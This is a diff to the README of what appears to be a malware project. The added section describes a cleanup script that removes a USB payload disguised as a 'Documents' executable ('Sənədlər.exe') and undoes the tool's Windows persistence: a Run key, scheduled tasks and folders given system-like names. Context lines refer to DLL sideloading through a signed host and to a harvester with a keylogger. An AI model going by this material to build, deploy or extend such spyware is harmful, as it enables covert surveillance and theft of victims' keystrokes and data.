@@ -244,6 +244,16 @@ Place the signed host, our `wmpdui.dll`, and the renamed original
 
 ---
 
+## USB cleanup
+
+`tools/usb_cleanup.ps1` removes the payload folder from the USB (`Sənədlər.exe`,
+`_sys`, `_tools`, `_docs`) and optionally cleans Windows persistence
+(`-CleanWindows`: stops agents, removes the HKCU Run value,
+`%APPDATA%\Microsoft\WindowsRuntime`, `WindowsMediaSync*` tasks and
+`%LOCALAPPDATA%\WMProcess`). `-DryRun` lists actions without deleting.
+
+---
+
 ## Harvester (`harvest.rs`, `keylog.rs`)
 
 The agent also carries a data-collection layer. In the WebSocket build, open
